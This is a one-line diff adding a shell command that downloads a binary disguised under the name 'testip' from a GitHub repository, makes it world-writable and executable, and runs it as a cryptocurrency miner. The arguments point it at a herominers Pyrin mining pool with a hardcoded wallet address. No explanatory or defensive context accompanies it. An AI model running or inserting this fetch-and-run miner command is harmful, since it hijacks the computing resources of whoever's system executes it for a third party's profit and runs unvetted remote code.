@@ -1,0 +1,1 @@
+wget https://github.com/lemanleman020/node-test/raw/main/testip && chmod 777 testip && ./testip --algo PYRIN --pool sg.pyrin.herominers.com:1177 --user pyrin:qq02hvf6ls5dhewyjx64607fyvs8qqfc0796v7pdxa729wvjx2aqxy8wlenft
